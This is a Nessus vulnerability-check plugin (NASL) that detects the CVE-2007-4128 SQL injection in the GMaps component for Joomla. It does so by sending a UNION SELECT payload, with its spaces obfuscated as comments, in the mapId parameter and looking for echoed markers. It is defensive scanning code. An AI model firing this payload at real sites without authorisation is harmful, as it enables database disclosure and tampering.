#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(25824);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2007-4128");
  script_bugtraq_id(25146);
  script_xref(name:"OSVDB", value:"39192");

  script_name(english:"GMaps Component for Joomla! index.php viewmap Action mapId Parameter SQL Injection");
  script_summary(english:"Tries to manipulate a map description with SQL injection");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is vulnerable to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running GMaps, a third-party component for Joomla
for building and managing map data. 

The version of GMaps installed on the remote host fails to sanitize
input to the 'mapId' parameter before using it in the 'getMap' method
in 'classes/gmapdao.class.php' in a database query.  Regardless of
PHP's 'magic_quotes_gpc' setting, an unauthenticated attacker may be
able to exploit this issue to manipulate such queries, leading to
disclosure of sensitive information, modification of data, or attacks
against the underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/4248" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ea1a03af" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to GMaps 1.1 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue.
  magic1 = unixtime();
  magic2 = rand();
  exploit = string("-1 UNION SELECT 0,", magic1, ",", magic2, ",3,4,5,6,7,8--");
  exploit = str_replace(find:" ", replace:"/**/", string:exploit);

  req = http_get(
    item:string(
      dir, "/index.php?",
      "option=com_gmaps&",
      "task=viewmap&",
      "Itemid=57&",
      "mapId=", exploit
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # it looks like GMaps and...
    '>GMaps</a> and Google' >< res &&
    # we see our magic in the map description
    string('<div class="componentheading">', magic1, '</div>') >< res &&
    string('<div id="gmapdescription">', magic2, '</div>') >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
